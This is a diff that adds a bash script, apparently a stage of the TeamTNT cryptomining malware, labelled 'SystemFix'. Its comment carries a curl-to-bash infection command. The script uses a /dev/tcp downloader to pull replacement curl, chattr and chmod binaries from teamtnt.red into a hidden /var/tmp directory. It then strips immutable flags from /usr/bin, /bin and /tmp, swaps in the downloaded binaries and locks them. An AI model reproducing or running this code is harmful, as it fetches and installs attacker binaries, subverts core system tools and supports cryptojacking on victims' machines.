@@ -1,0 +1,55 @@
+#!/bin/bash
+
+#   curl http://teamtnt.red/scripte/[crypto]miner.SystemFix.sh.txt | bash
+
+
+TNTdLOAD() {
+  read proto server path <<< "${1//"/"/ }"
+  DOC=/${path// //}
+  HOST=${server//:*}
+  PORT=${server//*:}
+  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
+  exec 3<>/dev/tcp/${HOST}/$PORT
+  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
+  while IFS= read -r line ; do 
+      [[ "$line" == $'\r' ]] && break
+  done <&3
+  nul='\0'
+  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
+      printf "%s$nul" "$x"
+  done <&3
+  exec 3>&-
+}
+
+    mkdir -p /var/tmp/...SysFix../
+TNTdLOAD http://teamtnt.red/bin/SystemFix/x86_64/curl > /var/tmp/...SysFix../curl
+TNTdLOAD http://teamtnt.red/bin/SystemFix/x86_64/chattr > /var/tmp/...SysFix../chattr
+TNTdLOAD http://teamtnt.red/bin/SystemFix/x86_64/chmod > /var/tmp/...SysFix../chmod
+    if [ -f "/usr/bin/python3" ];then PYTHON_VER="/usr/bin/python3" ; fi
+    if [ -f "/usr/bin/python2" ];then PYTHON_VER="/usr/bin/python2" ; fi
+    if [ -f "/usr/bin/python2.7" ];then PYTHON_VER="/usr/bin/python2.7" ; fi
+$PYTHON_VER -c "import os,sys,stat;os.chmod('/var/tmp/...SysFix../chmod',stat.S_IRWXU)"
+    setfacl -m u::x /var/tmp/...SysFix../curl
+    setfacl -m u::x /var/tmp/...SysFix../chattr
+    setfacl -m u::x /var/tmp/...SysFix../chmod
+/var/tmp/...SysFix../chattr -ia $(command -v curl) $(command -v chattr) $(command -v chmod) 
+/var/tmp/...SysFix../chmod +x $(command -v curl) $(command -v chattr) $(command -v chmod) 
+    /var/tmp/...SysFix../chattr -ia $(command -v pkill) $(command -v top) $(command -v service) $(command -v systemctl) 
+    /var/tmp/...SysFix../chmod +x $(command -v pkill) $(command -v top) $(command -v service) $(command -v systemctl) 
+chattr -R -ia /usr/bin/* /bin/*
+chmod +x /usr/bin/* /bin/*
+    chattr -R -ia /tmp/
+    chmod 1777 /tmp/ -R
+rm -f $(command -v curl)
+rm -f $(command -v chmod)
+rm -f $(command -v chattr)
+    cp /var/tmp/...SysFix../chmod /usr/bin/chmod
+    cp /var/tmp/...SysFix../chattr /usr/bin/chattr
+    cp /var/tmp/...SysFix../curl /usr/bin/curl
+/var/tmp/...SysFix../chmod +x /usr/bin/curl /usr/bin/chmod /usr/bin/chattr
+/var/tmp/...SysFix../chattr +i /usr/bin/curl /usr/bin/chmod /usr/bin/chattr
+    rm -fr /var/tmp/...SysFix../
+echo "ERLEDIGT!"
+
+
+
